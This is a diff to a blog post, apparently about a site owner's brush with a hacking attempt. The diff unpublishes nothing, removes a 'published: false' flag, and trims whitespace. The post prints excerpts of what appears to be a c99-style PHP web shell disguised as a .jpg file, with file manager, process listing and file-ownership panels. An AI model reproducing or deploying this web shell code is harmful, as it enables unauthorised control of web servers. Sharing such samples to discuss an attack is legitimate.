@@ -3,7 +3,6 @@ layout: post
 title: Carroll Site Attempting to be hacked?
 categories: []
 tags: []
-published: false
 ---
 <pre class="lang:default decode:true crayon-selected" title="c998php.jpg">&lt;?php
 //Starting calls
@@ -2115,7 +2114,7 @@ if ($act == "ls")
    }
   }
   &lt;/script&gt;
-  &lt;input type=\"button\" onclick=\"ls_setcheckboxall(true);\" value=\"Hepsini Sec\"&gt;&amp;nbsp;&amp;nbsp;&lt;input type=\"button\" onclick=\"ls_setcheckboxall(false);\" value=\"Hepsini Sec(ME)\"&gt; 
+  &lt;input type=\"button\" onclick=\"ls_setcheckboxall(true);\" value=\"Hepsini Sec\"&gt;&amp;nbsp;&amp;nbsp;&lt;input type=\"button\" onclick=\"ls_setcheckboxall(false);\" value=\"Hepsini Sec(ME)\"&gt;
   &lt;b&gt;&lt;img src=\"".$surl."act=img&amp;img=arrow_ltr\" border=\"0\"&gt;";
   if (count(array_merge($sess_data["copy"],$sess_data["cut"])) &gt; 0 and ($usefsbuff))
   {
@@ -2364,7 +2363,7 @@ if ($act == "processes")
      echo "&lt;tr&gt;";
      $line = explode("	",$line);
      $line[1] = intval($line[1]); $line[2] = $line[3]; unset($line[3]);
-     $line[2] = intval(str_replace(" ","",$line[2]))*1024; 
+     $line[2] = intval(str_replace(" ","",$line[2]))*1024;
      $prcs[] = $line;
      echo "&lt;/tr&gt;";
     }
@@ -2472,7 +2471,7 @@ if ($act == "f")
    echo "&lt;b&gt;Information:&lt;/b&gt;&lt;table border=0 cellspacing=1 cellpadding=2&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Path&lt;/b&gt;&lt;/td&gt;&lt;td&gt; ".$d.$f."&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Size&lt;/b&gt;&lt;/td&gt;&lt;td&gt; ".view_size(filesize($d.$f))."&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;MD5&lt;/b&gt;&lt;/td&gt;&lt;td&gt; ".md5_file($d.$f)."&lt;/td&gt;&lt;/tr&gt;";
    if (!$win)
    {
-    echo "&lt;tr&gt;&lt;td&gt;&lt;b&gt;Owner/Group&lt;/b&gt;&lt;/td&gt;&lt;td&gt; ";    
+    echo "&lt;tr&gt;&lt;td&gt;&lt;b&gt;Owner/Group&lt;/b&gt;&lt;/td&gt;&lt;td&gt; ";
     $ow = posix_getpwuid(fileowner($d.$f));
     $gr = posix_getgrgid(filegroup($d.$f));
     echo ($ow["name"]?$ow["name"]:fileowner($d.$f))."/".($gr["name"]?$gr["name"]:filegroup($d.$f));
